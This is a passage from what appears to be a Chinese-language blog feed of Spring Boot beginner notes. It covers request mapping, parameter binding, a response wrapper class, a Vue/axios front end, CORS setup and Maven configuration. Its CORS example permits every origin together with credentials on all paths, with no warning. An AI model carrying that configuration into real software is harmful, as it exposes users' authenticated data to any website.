&quot;/testMethod2&quot;,headers = &quot;deviceType=ios&quot;)</span><span class="comment">//请求头必须是deviceType且等于ios</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod3&quot;,headers = &quot;deviceType!=ios&quot;)</span><span class="comment">//请求头必须是deviceType且不等于ios</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求头Content-Type"><a href="#指定请求头Content-Type" class="headerlink" title="指定请求头Content-Type"></a>指定请求头Content-Type</h3><p><strong>Content-Type</strong>可使用<strong>consume</strong>来指定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/testMethod&quot;,consumes = &quot;multipart/form-data&quot;)</span><span class="comment">//ContentType必须是multipart/form-data</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/testMethod1&quot;,consumes = &quot;!multipart/form-data&quot;)</span><span class="comment">//ContentType不能是multipart/form-data</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a>获取请求参数</h2><h3 id="路径参数"><a href="#路径参数" class="headerlink" title="路径参数"></a>路径参数</h3><blockquote>
<p>RestFul风格的接口一些参数在请求路径上。</p>
<p>比如/user/1,这里的1就是id</p>
</blockquote>
<p>那么如果我们想获取路径上的参数，我们可以用<code>@PathVariable</code>来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单个参数</span></span><br><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="type">int</span> myID)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;your id is &quot;</span>+myID;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多个参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/user/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="type">int</span> myID,<span class="meta">@PathVariable</span> String myName)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;your id is &quot;</span>+myID+<span class="string">&quot; and your name is &quot;</span>+myName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="json参数"><a href="#json参数" class="headerlink" title="json参数"></a>json参数</h3><blockquote>
<p>RestFul风格的接口中，一些复杂的参数会转换成json传参，那么我们可以用<code>@RequestBody</code>来获取数据</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>POSTMAN</code>中发送<code>JSON</code>内容：<code>&#123;&quot;name&quot;:&quot;leihehe&quot;,&quot;age&quot;:10&#125;</code></p>
<p>多个用户数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/multipleUsers&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;User&gt; users)</span>&#123;</span><br><span class="line">    System.out.println(users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insert Users&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>POSTMAN</code>中发送<code>JSON</code>内容：</p>
<p><code>[&#123;&quot;name&quot;:&quot;leihehe&quot;,&quot;age&quot;:10&#125;,&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:11&#125;,&#123;&quot;name&quot;:&quot;wangzhe&quot;,&quot;age&quot;:12&#125;]</code></p>
<p>注意发送的时候要选择<code>json</code></p>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718172352273.png" alt="image-20210718172352273"></p>
<h3 id="QueryString参数"><a href="#QueryString参数" class="headerlink" title="QueryString参数"></a>QueryString参数</h3><h4 id="什么是QueryString参数？"><a href="#什么是QueryString参数？" class="headerlink" title="什么是QueryString参数？"></a>什么是QueryString参数？</h4><p>格式类似于<code>/users?name=leihehe&amp;age=11</code></p>
<p>可以使用<code>@RequestParam</code>来获取<code>QueryString</code>格式的参数</p>
<h4 id="如何获取？"><a href="#如何获取？" class="headerlink" title="如何获取？"></a>如何获取？</h4><p>若请求参数和我们方法里的变量名一样，则不需要<code>@RequestParam</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="type">int</span> id, String name, String[] likes)</span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若请求参数和我们方法里的变量名不一样，需要<code>@RequestParam</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam</span> <span class="type">int</span> id, String name, String[] likes)</span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实体获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(User user)</span>&#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>URL:</strong><code>127.0.0.1:8080/testRequestParam?id=1&amp;name=shulei&amp;likes=xuexi&amp;likes=xitou</code></p>
<h2 id="相关注解其他属性"><a href="#相关注解其他属性" class="headerlink" title="相关注解其他属性"></a>相关注解其他属性</h2><h3 id="required"><a href="#required" class="headerlink" title="required"></a>required</h3><p>代表是否必须，默认值为<code>true</code>也就是必须要有对应的参数。如果没有就会报错。<br>如果对应的参数可传可不传则可以把去设置为<code>false</code><br>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;,required = false)</span> String name)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="defaultValue"><a href="#defaultValue" class="headerlink" title="defaultValue"></a>defaultValue</h3><p>如果对应的参数没有，我们可以用<code>defaultValue</code>属性设置默认值。<br>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;,required = false,defaultValue = &quot;aaa&quot;)</span> String name)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查询用户接口"><a href="#查询用户接口" class="headerlink" title="查询用户接口"></a>查询用户接口</h2><p><code>Controller-&gt;service(interface)-&gt;mapper(interface)-&gt;resources/mapper.xml</code></p>
<p><code>service(interface)&lt;-serviceImp</code></p>
<h2 id="接口相应格式"><a href="#接口相应格式" class="headerlink" title="接口相应格式"></a>接口相应格式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*用这个class来封装数据*/</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseResult</span>&lt;T&gt; &#123;<span class="comment">//泛型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;<span class="comment">//状态码</span></span><br><span class="line">    <span class="keyword">private</span> String msg;<span class="comment">//提示信息</span></span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMsg</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMsg</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(T data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseResult</span><span class="params">(<span class="type">int</span> code,String msg)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.code=code;</span><br><span class="line">        <span class="built_in">this</span>.msg=msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ResponseResult</span><span class="params">(<span class="type">int</span> code,T data)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.code=code;</span><br><span class="line">        <span class="built_in">this</span>.data=data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="前端发送请求"><a href="#前端发送请求" class="headerlink" title="前端发送请求"></a>前端发送请求</h2><p>我们需要用到<a href="http://axios-js.com/docs/">Axios</a>和<a href="https://cn.vuejs.org/v2/guide/">Vue.js</a></p>
<p>在<code>html</code>中添加如下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- development version, includes helpful console warnings --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">created</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="variable language_">this</span>.<span class="title function_">fetchAllUsers</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">fetchAllUsers</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//请求后台接口，把接收到的数据在页面中展示</span></span></span><br><span class="line"><span class="language-javascript">            axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8666/user/findAll&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h2><h3 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h3><p>在使用<code>XMLHttpRequest</code>对象发送<code>HTTP</code>请求的时候，必须遵循同源策略</p>
<h3 id="CORS解决跨域"><a href="#CORS解决跨域" class="headerlink" title="CORS解决跨域"></a>CORS解决跨域</h3><p>CORS是<code>Cross-origin resource sharing</code>的全称，允许浏览器跨源发送<code>XMLHttpRequest</code>请求，从而克服AJAX只能同源使用的限制。</p>
<p>它通过服务器增加一个特殊的<code>header(Access-Control-Allow-Origin)</code>来告诉客户端跨域的限制，如果浏览器支持CORS并且判断<code>Orgin</code>通过的话，就会允许<code>XMLHttpRequest</code>发起跨域请求。</p>
<h3 id="Springboot使用CORS解决跨域请求"><a href="#Springboot使用CORS解决跨域请求" class="headerlink" title="Springboot使用CORS解决跨域请求"></a>Springboot使用CORS解决跨域请求</h3><h4 id="方法一：-CrossOrigin"><a href="#方法一：-CrossOrigin" class="headerlink" title="方法一：@CrossOrigin"></a>方法一：@CrossOrigin</h4><p>直接在想要跨域请求的<code>method</code>或者<code>Class</code>上加<code>@CrossOrigin</code></p>
<p>但是这个方法有缺陷，会添加很多注释</p>
<h4 id="方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor"><a href="#方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor" class="headerlink" title="方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor"></a>方法二：WebMvcConfigurer中的addCorsMappings方法来配置Corsinterceptor</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CorsConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span>&#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)<span class="comment">//允许访问的路径</span></span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)<span class="comment">//允许的域名</span></span><br><span class="line">                .allowCredentials(<span class="literal">true</span>)<span class="comment">//cookie</span></span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;DELETE&quot;</span>,<span class="string">&quot;PUT&quot;</span>)<span class="comment">//允许的请求方法</span></span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>)<span class="comment">//允许的请求头</span></span><br><span class="line">                .maxAge(<span class="number">3600</span>);<span class="comment">//允许时间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="前端渲染"><a href="#前端渲染" class="headerlink" title="前端渲染"></a>前端渲染</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- development version, includes helpful console warnings --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> v = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">users</span>:[]</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">created</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="variable language_">this</span>.<span class="title function_">fetchAllUsers</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">fetchAllUsers</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//请求后台接口，把接收到的数据在页面中展示</span></span></span><br><span class="line"><span class="language-javascript">            axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8666/user/findAll&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span>(res.<span class="property">data</span>.<span class="property">code</span>==<span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">this</span>.<span class="property">users</span>=res.<span class="property">data</span>.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">   &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;table-responsive&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-striped table-bordered table-hover&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>学号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>地址<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;user in users&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.id&#125;&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.username&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.age&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;user.address&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程</p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-基础入门笔记(1)</title>
    <url>/2021/07/16/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<h1 id="SpringBoot-基础入门笔记-1"><a href="#SpringBoot-基础入门笔记-1" class="headerlink" title="SpringBoot-基础入门笔记(1)"></a>SpringBoot-基础入门笔记(1)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>非常感谢<a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程，内容基本来源于<strong>三根草堂</strong>师父，也是学习边记录，希望通过学习能写出自己写出一个项目，且对<code>Javaweb</code>类的程序有一定了解，并能够入门<code>Java</code>安全代码审计。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="版本要求"><a href="#版本要求" class="headerlink" title="版本要求"></a>版本要求</h3><p>JDK : 8+<br>Maven ：3.5.x+</p>
<p>这里我选用<strong>2.5.2</strong>版本的<strong>Spring Boot</strong></p>
<h3 id="新建一个SpringBoot项目"><a href="#新建一个SpringBoot项目" class="headerlink" title="新建一个SpringBoot项目"></a>新建一个SpringBoot项目</h3><h4 id="方法一：Idea手动导入"><a href="#方法一：Idea手动导入" class="headerlink" title="方法一：Idea手动导入"></a>方法一：Idea手动导入</h4><p>创建一个空的Maven项目，在<code>File-Setting</code>中配置好Maven</p>
<span id="more"></span>

<p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716232948699.png" alt="image-20210716232948699"></p>
<p><code>maven</code>和其仓库目录根据自己的情况修改。</p>
<p>创建好项目后，会自动生成一个<code>pom.xml</code>，</p>
<p><strong>再导入依赖</strong>：（相关说明在注解里）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Inherit defaults from Spring Boot--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="comment">&lt;!--这里SpringBootStarter帮我们集成了很多依赖，必须要继承--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="comment">&lt;!--这里的版本是根据你的Spring Boot版本来的--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Add typical dependencies for a web application--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="comment">&lt;!--这里是实现web功能的必须要的dependency，同样有很多依赖集成--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 可以使用mavin插件 可以用来打包等很多方便的操作--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们还需要配置下<code>Setting.xml</code>文件</p>
<p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716233557981.png" alt="image-20210716233557981"></p>
<p>打开后在Setting标签下添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--下面是添加阿里云镜像，这样下载依赖更快，不过我在国外使用这个镜像反而无法下载，所以如果不适用直接注释掉就好了--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下面是需要指定你的jdk版本，我的是1.8--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span 